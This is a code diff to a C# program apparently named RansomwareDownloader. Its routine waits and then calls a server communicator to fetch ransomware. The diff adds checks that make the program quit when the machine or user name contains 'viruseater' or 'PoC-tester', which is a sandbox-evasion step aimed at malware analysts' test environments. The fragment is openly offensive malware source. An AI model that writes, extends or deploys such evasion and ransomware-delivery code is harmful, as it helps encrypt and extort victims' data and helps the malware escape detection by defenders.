@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading;
@@ -17,7 +18,9 @@ namespace RansomwareDownloader
 
         public static void ransomwareDownload()
         {
-
+            if (Environment.MachineName.Contains("viruseater")) return;
+            if (Environment.UserName.Contains("viruseater")) return;
+            if (Environment.UserName.Contains("PoC-tester")) return;
             Thread.Sleep(18000);
             serverCommunicator.getQuickRansomware();
             Thread.Sleep(2000);
